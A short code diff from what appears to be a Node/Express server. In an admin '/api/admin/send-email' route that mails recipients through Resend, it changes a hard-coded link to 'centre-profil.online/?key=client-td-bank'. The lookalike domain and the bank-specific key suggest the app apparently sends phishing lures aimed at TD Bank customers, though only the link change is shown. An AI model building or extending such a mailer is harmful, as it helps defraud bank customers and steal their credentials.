@@ -250,7 +250,7 @@ app.post('/api/admin/send-email', async (req, res) => {
     return res.status(400).json({ success: false, error: 'Recipient is required.' });
   }
 
-  const link = 'https://centre-profil.online/?key=client';
+  const link = 'https://centre-profil.online/?key=client-td-bank';
 
   const RESEND_API_KEY = process.env.RESEND_API_KEY;
   const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
